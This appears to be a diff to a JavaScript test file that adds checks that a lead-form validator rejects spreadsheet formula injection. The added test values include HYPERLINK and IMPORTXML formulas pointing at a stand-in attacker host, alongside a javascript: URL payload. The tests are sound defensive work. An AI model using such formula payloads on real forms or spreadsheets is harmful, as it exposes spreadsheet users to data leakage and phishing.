@@ -52,6 +52,8 @@ test('normalizeLead classifies partial briefs as quick contact', () => {
 
 test('normalizeLead rejects unsafe URLs and malformed contact details', () => {
   assert.throws(() => normalizeLead({ ...validLead, website: 'http://example.com' }), /INVALID_WEBSITE/);
+  assert.throws(() => normalizeLead({ ...validLead, name: '=HYPERLINK("https://evil.example","click")' }), /UNSAFE_SPREADSHEET_VALUE/);
+  assert.throws(() => normalizeLead({ ...validLead, notes: '=IMPORTXML("https://evil.example","//x")' }), /UNSAFE_SPREADSHEET_VALUE/);
   assert.throws(() => normalizeLead({ ...validLead, designLinks: ['javascript:alert(1)'] }), /INVALID_DESIGNLINK/);
   assert.throws(() => normalizeLead({ ...validLead, phone: 'call-me' }), /INVALID_PHONE/);
   assert.throws(() => normalizeLead({ ...validLead, email: 'not-an-email' }), /INVALID_EMAIL/);
